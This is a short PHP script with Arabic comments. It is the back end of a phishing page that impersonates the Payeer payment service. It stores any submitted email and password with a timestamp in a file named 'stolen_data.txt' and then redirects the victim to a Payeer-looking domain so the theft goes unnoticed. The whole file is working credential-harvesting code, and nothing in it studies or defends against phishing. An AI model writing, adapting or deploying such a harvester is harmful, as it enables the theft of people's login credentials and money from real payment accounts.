<?php
error_reporting(E_ALL);
ini_set('display_errors', 1);

session_start();

// معالجة البيانات المرسلة
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'] ?? '';
    $password = $_POST['password'] ?? '';

    // تسجيل البيانات
    if (!empty($email) && !empty($password)) {
        $data = "Email: $email | Password: $password | Time: " . date('Y-m-d H:i:s') . "\n";
        file_put_contents('stolen_data.txt', $data, FILE_APPEND);
    }

    // إعادة التوجيه بعد المعالجة
    header('Location: https://real-payeer.com');
    exit();
} else {
    // إذا لم يتم الإرسال بطريقة POST
    header('Location: index.html');
    exit();
}
?>
